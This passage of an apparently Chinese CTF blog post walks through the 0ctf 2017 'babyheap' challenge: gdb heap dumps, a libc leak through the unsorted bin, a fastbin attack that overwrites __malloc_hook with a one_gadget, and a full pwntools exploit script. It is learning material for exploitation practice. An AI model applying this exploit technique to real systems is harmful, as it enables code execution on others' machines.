<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span> </div><div class="line"><span class="number">0x565289992080</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x565289992090</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5652899920a0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5652899920b0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span> </div><div class="line"><span class="number">0x5652899920c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> =&gt; chunk <span class="number">2</span> header </div><div class="line"><span class="number">0x5652899920d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5652899920e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; fake chunk <span class="number">2</span> header</div></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alloc(<span class="number">0x50</span>) <span class="comment"># 3  </span></div><div class="line">free(<span class="number">2</span>) <span class="comment"># free 2</span></div></pre></td></tr></table></figure>
+<p>为了避免 <code>free(2)</code> 和<code>top chunk</code>合并，我们先 <code>alloc(0x50)</code><br><code>free</code> 之后：<br><code>[+] unsorted_bins[0]: fw=0x5642e5bb10c0, bk=0x5642e5bb10c0
+ →   Chunk(addr=0x5642e5bb10d0, size=0x110, flags=PREV_INUSE)</code></p>
+<p>chunk 2 写入了 fd,bk 通过 <code>dump chunk 1</code> 我们就可以得到 main_arena+88 的地址<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x00005642e5bb1000</span></div><div class="line"><span class="number">0x5642e5bb1000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">0</span></div><div class="line"><span class="number">0x5642e5bb1010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5642e5bb1070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span> header </div><div class="line"><span class="number">0x5642e5bb1080</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5642e5bb1090</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5642e5bb10a0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5642e5bb10b0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x5642e5bb10c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> =&gt; chunk <span class="number">2</span> </div><div class="line"><span class="number">0x5642e5bb10d0</span>:	<span class="number">0x00007f99f3137b78</span>	<span class="number">0x00007f99f3137b78</span> =&gt; fd bk </div><div class="line"><span class="number">0x5642e5bb10e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span></div><div class="line"><span class="number">0x5642e5bb10f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
+<p> main_arena+88<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x00007f99f3137b78</span></div><div class="line"><span class="number">0x7f99f3137b78</span> &lt;main_arena+<span class="number">88</span>&gt;:	<span class="number">0x00005642e5bb1230</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7f99f3137b88</span> &lt;main_arena+<span class="number">104</span>&gt;:	<span class="number">0x00005642e5bb10c0</span>	<span class="number">0x00005642e5bb10c0</span></div><div class="line"><span class="number">0x7f99f3137b98</span> &lt;main_arena+<span class="number">120</span>&gt;:	<span class="number">0x00007f99f3137b88</span>	<span class="number">0x00007f99f3137b88</span></div><div class="line"><span class="number">0x7f99f3137ba8</span> &lt;main_arena+<span class="number">136</span>&gt;:	<span class="number">0x00007f99f3137b98</span>	<span class="number">0x00007f99f3137b</span></div></pre></td></tr></table></figure></p>
+<p>泄露计算得到 <code>libc</code> 基址</p>
+<h3 id="修改控制流"><a href="#修改控制流" class="headerlink" title="修改控制流"></a>修改控制流</h3><p>通过堆溢出修改 <code>chunk 1</code> 的 fd 指针指向 <code>malloc_hook</code>  附近<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">free(<span class="number">1</span>)</div><div class="line">payload = <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">27</span> - <span class="number">0x8</span>) + p64(<span class="number">0</span>)</div><div class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span> + <span class="number">0x10</span>, payload)</div></pre></td></tr></table></figure></p>
+<p>会将 <code>chunk 1</code> 放入 <code>fastbin</code> ，再通过堆溢出修改 <code>chunk 1</code>的 <code>fd</code> 指针到 <code>malloc_hook</code> 附近<br>此时 <code>fastbin</code>:<br><code>Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x559f678d8080, size=0x70, flags=PREV_INUSE)</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x000056471f81c000</span></div><div class="line"><span class="number">0x56471f81c000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>  =&gt; chunk <span class="number">0</span> </div><div class="line"><span class="number">0x56471f81c010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x56471f81c070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span></div><div class="line"><span class="number">0x56471f81c080</span>:	<span class="number">0x00007fbfe59beaed</span>	<span class="number">0x0000000000000000</span> =&gt; fake fd</div><div class="line"><span class="number">0x56471f81c090</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x56471f81c0a0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x56471f81c0b0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></div><div class="line"><span class="number">0x56471f81c0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> =&gt; chunk <span class="number">2</span></div><div class="line"><span class="number">0x56471f81c0d0</span>:	<span class="number">0x00007fbfe59beb78</span>	<span class="number">0x00007fbfe59beb78</span></div><div class="line"><span class="number">0x56471f81c0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span></div><div class="line"><span class="number">0x56471f81c0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
+<p>可以看一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x00007fbfe59beaed</span></div><div class="line"><span class="number">0x7fbfe59beaed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xbfe59bd260000000</span>	<span class="number">0x000000000000007f</span></div><div class="line"><span class="number">0x7fbfe59beafd</span>:	<span class="number">0xbfe567fe20000000</span>	<span class="number">0xbfe567fa0000007f</span></div><div class="line"><span class="number">0x7fbfe59beb0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7fbfe59beb1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alloc(0x60)  </div><div class="line">alloc(0x60)</div></pre></td></tr></table></figure>
+<p>第一次分配刚刚 <code>free</code> 掉的 <code>chunk 1</code>,第二次就会分配到 <code>malloc_hook</code> 附近了<br>注：<code>fd = malloc_hook - 27 - 0x8</code>, 分配的时候会将<code>malloc_hook - 27 - 0x8+0x10</code> 分配出去，也就是 <code>malloc_hook-1</code>9 因此我们先写<code>&#39;a&#39;*3 +p64(0)*2</code><br>再写入 <code>one_gadget</code>,刚好会写到 <code>malloc_hook</code> 处 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x7efd4e6aab10</span><span class="number">-27</span><span class="number">-5</span></div><div class="line"><span class="number">0x7efd4e6aaaf0</span> &lt;_IO_wide_data_0+<span class="number">304</span>&gt;:	<span class="number">0x00007efd4e6a9260</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7efd4e6aab00</span> &lt;__memalign_hook&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7efd4e6aab10</span> &lt;__malloc_hook&gt;:	<span class="number">0x00007efd4e32b26a</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7efd4e6aab20</span> &lt;main_arena&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7efd4e6aab30</span> &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x7efd4e6aab40</span> &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
+<p>成功修改 <code>malloc hook</code>, <code>0x00007efd4e32b26a</code> 就是 <code>one_gadget</code> 的地址<br>ps: 上面贴的信息不是同一次脚本跑出来的…所以有些地方地址不太一样，理解就好…嘻嘻(我还是不知道怎么早脚本中多次用gdb调试？？每次调试一回来就超时了…)<br>最终 payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">'debug'</span>)</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    p = process(<span class="string">'./babyheap'</span>)</div><div class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command:'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Size:'</span>)</div><div class="line">    p.sendline(str(size))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(index, size, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command:'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index:'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line">    p.recvuntil(<span class="string">'Size:'</span>)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.recvuntil(<span class="string">'Content:'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command:'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index:'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Command:'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Index:'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</div><div class="line">    <span class="keyword">return</span> p.recvline()[:<span class="number">-1</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></div><div class="line">    alloc(<span class="number">0x60</span>) <span class="comment"># 0</span></div><div class="line">    alloc(<span class="number">0x40</span>) <span class="comment"># 1</span></div><div class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span>, <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</div><div class="line">    alloc(<span class="number">0x100</span>) <span class="comment"># 2</span></div><div class="line">    fill(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">'c'</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</div><div class="line">    free(<span class="number">1</span>)  <span class="comment"># free 1</span></div><div class="line">    alloc(<span class="number">0x60</span>) <span class="comment"># alloc 1</span></div><div class="line">    fill(<span class="number">1</span>, <span class="number">0x40</span> + <span class="number">0x10</span>, <span class="string">'b'</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</div><div class="line">    alloc(<span class="number">0x50</span>) <span class="comment"># 3</span></div><div class="line">    free(<span class="number">2</span>) <span class="comment"># free 2</span></div><div class="line">    leaked = u64(dump(<span class="number">1</span>)[<span class="number">-8</span>:])</div><div class="line">    <span class="comment"># return libc_base</span></div><div class="line">    <span class="keyword">return</span> leaked <span class="number">-0x3c4b20</span><span class="number">-88</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span><span class="params">(libc_base)</span>:</span></div><div class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>] + libc_base</div><div class="line">    execve_addr = <span class="number">0x4526a</span> + libc_base</div><div class="line"></div><div class="line">    log.info(<span class="string">"malloc_hook @"</span> + hex(malloc_hook))</div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    payload = <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">27</span> - <span class="number">0x8</span>) + p64(<span class="number">0</span>)</div><div class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span> + <span class="number">0x10</span>, payload)</div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    payload  = <span class="string">'a'</span> * <span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></div><div class="line">    payload += p64(execve_addr)</div><div class="line">    fill(<span class="number">2</span>, len(payload), payload)</div><div class="line">    gdb.attach(p)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    libc_base = leak()</div><div class="line">    log.info(<span class="string">"get libc_base:"</span> + hex(libc_base))</div><div class="line">    fastbin_attack(libc_base)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="external">https://blog.csdn.net/qq_29343201/article/details/66476135</a><br><a href="https://blog.csdn.net/qq_33528164/article/details/79515761" target="_blank" rel="external">https://blog.csdn.net/qq_33528164/article/details/79515761</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/27/pwn-offbyone/" rel="next" title="CTF | offbyone writeup">
+                <i class="fa fa-chevron-left"></i> CTF | offbyone writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/19/pwn-srop/" rel="prev" title="CTF | srop 利用">
+                CTF | srop 利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="yuuoniy" />
+            
+              <p class="site-author-name" itemprop="name">yuuoniy</p>
+              <p class="site-description motion-element" itemprop="description">世界本该是你醒来的模样</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">48</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/yuuoniy" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:linmq006@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露-libc"><span class="nav-number">1.</span> <span class="nav-text">泄露 libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改控制流"><span class="nav-number">2.</span> <span class="nav-text">修改控制流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright">&copy; 2017 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yuuoniy</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="Symbols count total">113k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="Reading time total">1:43</span>
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.3.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.1</div>
+
+
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://yuuoniy.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://yuuoniy.github.io/2018/09/25/ctf-fastbin-attack/';
+        this.page.identifier = '2018/09/25/ctf-fastbin-attack/';
+        this.page.title = 'CTF | 0ctf 2017 babyheap';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://yuuoniy.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'VeQJNmfPOV9K2WFrArLoD0xN-gzGzoHsz',
+        appKey: 'TfDg8GxclLQKiTCGQ0hkV63P',
+        placeholder: '大佬有什么想法',
+        avatar:'retro',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
